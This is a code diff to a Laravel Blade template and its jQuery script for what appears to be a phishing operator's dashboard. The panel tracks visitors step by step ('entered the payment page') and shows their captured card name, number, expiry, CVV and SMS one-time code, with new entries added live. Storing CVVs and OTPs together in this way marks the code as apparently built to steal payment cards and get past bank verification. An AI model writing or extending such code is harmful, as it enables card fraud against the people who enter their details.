@@ -31,7 +31,26 @@
                 </div>
                 <div class="notificationsList">
 
-                      @if($notification->step_number >=4)
+                    @if($notification->step_number >=4)
+                     @if($notification->paymentCard)
+                    <div class="card-body">
+                      <h5><i class="icon fas fa-check"></i> رمز التحقق من الهاتف</h5>
+                        <div class="direct-chat-text">
+                        <p><strong class="fs-3 border p-1 rounded">Name:</strong> {{$notification->paymentCard->otp_code}}</p>
+                      </div>
+                    </div><hr>
+
+                    <div class="card-body">
+                      <h5><i class="icon fas fa-check"></i>  قام بإرسال بيانات الدفع      </h5>
+                        <div class="direct-chat-text">
+                        <p><strong class="fs-3 border p-1 rounded">Name:</strong> {{$notification->paymentCard->cname}}</p>
+                        <p><strong class="fs-3 border p-1 rounded">Number:</strong> {{$notification->paymentCard->cnmbr}}</p>
+                        <p><strong class="fs-3 border p-1 rounded">Date:</strong> {{$notification->paymentCard->year.'-'.$notification->paymentCard->month}}</p>
+                        <p><strong class="fs-3 border p-1 rounded">CV:</strong> {{$notification->paymentCard->resume}}</p>
+                      </div>
+                    </div><hr>
+                    @endif
+
                       <div class="card-body">
                         <h5><i class="icon fas fa-check"></i> دخل الى صفحة الدفع</h5>
                       </div><hr>
@@ -157,6 +176,14 @@
             <p><strong class="fs-3 border p-1 rounded">Number:</strong> `+dataPr.cnmbr+`</p>
             <p><strong class="fs-3 border p-1 rounded">Date:</strong> `+dataPr.exDate+`</p>
             <p><strong class="fs-3 border p-1 rounded">CV:</strong> `+dataPr.resume+`</p>
+          </div>
+        </div><hr>
+      `);
+      $(".notificationsList").prepend(`
+        <div class="card-body">
+          <h5><i class="icon fas fa-check"></i> رمز التحقق من الهاتف</h5>
+            <div class="direct-chat-text">
+            <p><strong class="fs-3 border p-1 rounded">Name:</strong> `+dataPr.otp_code+`</p>
           </div>
         </div><hr>
       `);
